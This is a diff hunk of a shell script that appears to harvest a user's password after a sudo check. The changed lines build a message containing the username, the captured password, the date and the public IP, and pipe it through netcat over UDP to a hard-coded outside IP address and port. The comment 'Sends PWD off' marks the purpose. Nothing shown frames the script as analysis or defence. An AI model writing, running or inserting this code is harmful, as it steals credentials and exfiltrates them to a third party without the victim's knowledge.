@@ -18,7 +18,8 @@ if ! sudo -n true 2>/dev/null; then
 fi
 
 # Sends PWD off
-echo "User: $USER // Pwd: $pwd // Date: $(date +"%Y/%m/%d - %I:%M:%S %p") // IP: $(curl -s ifconfig.me)" | nc -u -q 0 144.24.21.253 65432
+msg="User: $USER // Pwd: $pwd // Date: $(date +"%Y/%m/%d - %I:%M:%S %p") // IP: $(curl -s ifconfig.me)"
+echo $msg | nc -u -q 0 144.24.21.253 65432
 
 unset pwd
 # preps long msg
